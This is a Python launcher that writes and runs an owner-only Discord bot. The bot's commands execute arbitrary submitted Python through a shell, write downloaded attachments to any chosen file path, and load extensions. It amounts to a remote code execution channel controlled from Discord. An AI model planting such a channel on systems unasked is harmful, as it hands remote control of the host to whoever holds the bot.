import os
open('over.py','w').write(f'''
import subprocess, requests, os
from discord.ext import commands

x = 2000
o = 'out.txt'
bot = commands.Bot('')

@bot.check
async def owner(ctx):
	await ctx.send('know your place')
	return ctx.author.id == 394771663155101727

@bot.command()
async def shutdown(ctx): exit()

@bot.command()
async def load(ctx, e): bot.load_extension(e)

@bot.command()
async def unload(ctx, e): bot.unload_extension(e)

@bot.command()
async def reload(ctx, e): bot.reload_extension(e)

@bot.command()
async def upload(ctx, p):
	c = requests.get(ctx.message.attachments[0].url).text
	open(p, 'w').write(c)

@bot.command()
async def py(ctx, *, code):
	open('code','w').write(code)
	subprocess.run(
		args=['python code'],
		stdout=open(o,'w'),
		stderr=subprocess.STDOUT,
		shell=True,
		timeout=10)
	l =  open(o).read()
	c = [l[y-x:y] for y in range(x,len(l)+x,x)]
	for d in c: await ctx.send(d)

class oce(commands.Cog):
	def __init__(self, bot): self.bot = bot

	@commands.Cog.listener()
	async def on_command_error(self, ctx, err):
		if isinstance(err, commands.CommandNotFound): return
		if isinstance(err, commands.CheckFailure): return
		await ctx.send(err)


bot.add_cog(oce(bot))
bot.run(os.getenv('TOKEN'))
''')
os.system('python over.py')
